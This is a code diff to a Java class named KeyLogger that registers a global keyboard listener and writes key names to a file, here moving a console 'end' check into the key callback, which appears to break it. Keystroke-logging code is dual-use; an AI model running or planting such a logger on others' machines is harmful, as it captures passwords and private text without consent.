@@ -30,44 +30,26 @@ public class KeyLogger {
         NativeKeyListener listener = new NativeKeyListener() {
             @Override
             public void nativeKeyReleased(NativeKeyEvent nativeEvent) {
-                try {
-                    if (!stopLogging) {
+                Scanner scanner = new Scanner(System.in);
+                while(!stopLogging) {
+                    String input = scanner.nextLine();
+                    if (input.equalsIgnoreCase("end")) {
+                        stopLogging = true;
+                    }
+                    try {
                         writer.write(NativeKeyEvent.getKeyText(nativeEvent.getKeyCode()));
                         writer.write(" ");
                         writer.flush();
+                    } catch (IOException e) {
+                        System.out.println("Error when logging");
+                        e.printStackTrace();
                     }
-                } catch (IOException e) {
-                    System.out.println("Error when logging");
-                    e.printStackTrace();
                 }
             }
-        };
 
+        };
         GlobalScreen.addNativeKeyListener(listener);
 
-        Thread thread = new Thread(() -> {
-            Scanner scanner = new Scanner(System.in);
-            while (!stopLogging) {
-                String input = scanner.nextLine();
-                if (input.equalsIgnoreCase("end")) {
-                    stopLogging = true;
-                    break;
-                }
-            }
-            scanner.close();
-            try {
-                GlobalScreen.removeNativeKeyListener(listener);
-                writer.close();
-            } catch (IOException e) {
-                e.printStackTrace();
-            }
-        });
-        thread.start();
-        try {
-            thread.join();
-        } catch (InterruptedException e) {
-            e.printStackTrace();
-        }
     }
 
     public static void main(String[] args) {
